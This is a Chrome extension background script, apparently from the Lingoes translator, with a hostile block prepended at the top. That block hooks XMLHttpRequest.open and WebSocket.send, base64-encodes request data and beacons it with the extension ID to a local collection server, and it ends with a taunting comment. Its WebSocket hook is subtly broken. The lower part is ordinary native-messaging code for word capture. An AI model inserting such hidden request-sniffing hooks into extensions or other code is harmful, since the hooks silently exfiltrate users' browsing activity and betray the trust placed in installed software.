function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
﻿var lingoes_port = null;
var lingoes_msg_id = 0;

function onLingoesMessage(msg) {
  //console.log("Received:" + msg.cmd);
  if(msg.cmd == "exit")
  {
    //console.log("on Exit");
    closeLingoesPort();
  }
  else if(msg.cmd == "ping")
  {
  	lingoes_msg_id++;
  	var out = {
    	"cmd": "on_ping",
    	"msg_id": lingoes_msg_id,
    	"on_msg_id": msg.msg_id
    }	
    lingoes_port.postMessage(out);
    //console.log("Send: " + JSON.stringify(out));		    
  }
  else if(msg.cmd == "text_capture")
  {
  	// 请求取词
  	lingoes_msg_id++;
		chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
		  chrome.tabs.sendMessage(tabs[0].id, {'cmd': 'text_capture', 'max_length': msg.max_length}, function(response) {
		    var out = {
		    	"cmd": "on_text_capture",
		    	"msg_id": lingoes_msg_id,
		    	"on_msg_id": msg.msg_id, 
		    	"data": response 
		    }

		    lingoes_port.postMessage(out);
		  	//console.log("Send: " + JSON.stringify(out));		    
		  });
		});
  }
  else if(msg.cmd == "text_select")
  {
  	// 请求划词
  	lingoes_msg_id++;
		chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
		  chrome.tabs.sendMessage(tabs[0].id, {'cmd': 'text_select', 'max_length': msg.max_length}, function(response) {
		    var out = {
		    	"cmd": "on_text_select",
		    	"msg_id": lingoes_msg_id,
		    	"on_msg_id": msg.msg_id, 
		    	"data": response 
		    };

		    lingoes_port.postMessage(out);
		    //console.log("Send: " + JSON.stringify(out));		    
		  });
		});
  }
}

function onLingoesDisconnect() {
  //console.log("failed to connect: " + chrome.runtime.lastError.message);
  closeLingoesPort();
}

function closeLingoesPort() {
	if(lingoes_port)
	{
	  lingoes_port.onMessage.removeListener(onLingoesMessage);
	  lingoes_port.onDisconnect.removeListener(onLingoesDisconnect);
	  lingoes_port.disconnect();
	  lingoes_port = null;
	}
}

function connectLingoesPort() {
	if(lingoes_port == null)
	{
		// Connect Lingoes Native Messaging Server
		lingoes_port = chrome.runtime.connectNative('com.lingoes.translator');
		if(lingoes_port)
		{
			lingoes_port.onMessage.addListener(onLingoesMessage);
			lingoes_port.onDisconnect.addListener(onLingoesDisconnect);
			//console.log("connect to lingoes native message...")
		}
	}
	
	// Call connectLingoesPort() after 10 seconds, check this connection is valid
	setTimeout(arguments.callee, 10000);
}

// Connect to Lingoes Native Messaging Server
connectLingoesPort();

//lingoes_port.postMessage({cmd: "ping"});
